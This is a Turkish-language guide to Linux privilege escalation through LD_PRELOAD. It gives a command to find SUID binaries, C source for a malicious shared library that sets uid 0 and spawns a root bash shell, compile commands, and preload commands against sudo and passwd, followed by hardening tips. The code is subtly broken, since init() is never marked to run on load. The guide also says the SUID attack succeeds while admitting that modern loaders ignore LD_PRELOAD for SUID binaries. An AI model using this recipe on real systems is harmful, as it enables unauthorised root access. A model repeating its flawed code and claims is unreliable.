### **LD_PRELOAD Privilege Escalation Rehberi**

`LD_PRELOAD` tekniği, genellikle Linux sistemlerinde **Dynamic Linker/Loader** (dinamik bağlantı yükleyicisi) tarafından kullanılan bir ortam değişkenidir. Bu teknik, kötü niyetli bir kullanıcı tarafından suistimal edilerek, yetkili bir süreçte **kütüphaneleri manipüle etmek** için kullanılabilir. Bu rehberde `LD_PRELOAD` ile nasıl hak yükseltme yapılabileceği, teknik detayları ve koruma yöntemleri ele alınmaktadır.

---

### **LD_PRELOAD Nedir?**
`LD_PRELOAD`, bir program çalıştırılmadan önce belirli bir **paylaşımlı kütüphaneyi** yüklemek için kullanılan bir çevresel değişkendir. Normalde dinamik bağlantı yükleyicisi (ld.so veya ld-linux.so) tarafından belirlenen kütüphaneler yüklenir. Ancak, `LD_PRELOAD` ile bu davranışı değiştirebilir ve **özel bir kütüphaneyi** yükleyebilirsiniz.

---

### **LD_PRELOAD ile Hak Yükseltme Nasıl Yapılır?**

#### **1. Gereklilikler**
- **SUID-bit set edilmiş bir binary** (örneğin, `sudo`, `passwd` gibi).
- Ortam değişkenlerinin işleme aktarılmasına izin veren bir süreç.
- Kötü niyetli bir dinamik kütüphane (örneğin, `.so` dosyası).

#### **2. Adımlar**
1. **Hedef Binary'yi Belirleme**
   - SUID biti set edilmiş binary'leri belirlemek için:
     ```bash
     find / -perm -4000 2>/dev/null
     ```
     Örnek: `/usr/bin/sudo`

2. **Kötü Amaçlı Kütüphane Yazma**
   - Zararlı bir `C` kodu yazarak hedef binary'nin davranışını değiştirin:
     ```c
     #include <stdio.h>
     #include <stdlib.h>

     void init() {
         setuid(0); // root yetkisini alır
         setgid(0); // root grubuna geçer
         system("/bin/bash"); // root shell açar
     }
     ```
   - Bu kodu `malicious.c` olarak kaydedin.

3. **Kütüphaneyi Derleme**
   - Zararlı kütüphaneyi `.so` formatında derlemek için:
     ```bash
     gcc -fPIC -shared -o malicious.so malicious.c -nostartfiles
     ```

4. **LD_PRELOAD ile Kütüphaneyi Yükleme**
   - SUID biti set edilmiş bir programı zararlı kütüphaneyle çalıştırın:
     ```bash
     LD_PRELOAD=/path/to/malicious.so /usr/bin/sudo
     ```

5. **Root Yetkisi Alma**
   - Eğer işlem başarılı olursa, bir **root shell** açılır.

---

### **LD_PRELOAD'un Kısıtlamaları**
- **SUID Binary'ler**: Modern sistemlerde, SUID-bit set edilmiş binary'ler `LD_PRELOAD` ortam değişkenini sıklıkla devre dışı bırakır. Bu, `secure execution mode` nedeniyle olur.
- **PAM veya Güvenlik Mekanizmaları**: Ek güvenlik mekanizmaları, kütüphane enjeksiyonunu algılayabilir veya engelleyebilir.

---

### **LD_PRELOAD Zafiyetlerinden Korunma**

1. **Ortamdaki Değişkenleri Kısıtlama**
   - SUID süreçlerde `LD_PRELOAD` gibi ortam değişkenlerinin kullanılmasını önleyin.
   - Örneğin, `secure_getenv()` kullanımı ile zararlı ortam değişkenleri kontrol altına alınabilir.

2. **Kütüphane Yükleme Davranışını İnceleme**
   - Sistemin `ld.so` yapılandırmasını analiz ederek `LD_PRELOAD` kullanımını sınırlandırabilirsiniz.

3. **SUID Programlarının Sayısını Azaltma**
   - Sadece gerekli olan binary'lere SUID biti set edin. Örneğin:
     ```bash
     chmod -s /path/to/binary
     ```

4. **Dynamic Linker Güvenliği**
   - Modern glibc sürümleri `LD_PRELOAD` kullanımını SUID binary'lerle engeller. Bu nedenle, glibc'yi güncel tutmak önemlidir.

5. **SELinux/AppArmor Kullanımı**
   - SELinux veya AppArmor gibi güvenlik modülleri, belirli işlemler için `LD_PRELOAD` yükleme girişimlerini kısıtlayabilir.

---

### **Örnek Senaryo**

#### **Hedef: /usr/bin/passwd**
- Sistem üzerinde SUID biti set edilmiş `/usr/bin/passwd` binary'si mevcut.
- Kötü niyetli kullanıcı, aşağıdaki komutlarla `passwd` binary'sini manipüle eder:

1. **Kötü Kütüphane Oluşturma**:
   ```c
   #include <stdio.h>
   #include <stdlib.h>

   void init() {
       setuid(0);
       system("/bin/bash");
   }
   ```

   ```bash
   gcc -shared -o evil.so -fPIC malicious.c
   ```

2. **Hak Yükseltme**:
   ```bash
   LD_PRELOAD=/path/to/evil.so /usr/bin/passwd
   ```

3. **Sonuç**:
   - Shell root yetkisiyle açılır.

---

### **Sonuç**

`LD_PRELOAD`, Linux ortamında güçlü ve potansiyel olarak tehlikeli bir araçtır. Zararlı bir kütüphane yüklenerek hak yükseltme yapılabilir. Ancak modern sistemlerdeki güvenlik önlemleri bu tür saldırıları büyük ölçüde sınırlandırmıştır. Bu nedenle, sistemlerinizi korumak için yukarıdaki koruma yöntemlerini uygulamak kritik öneme sahiptir.
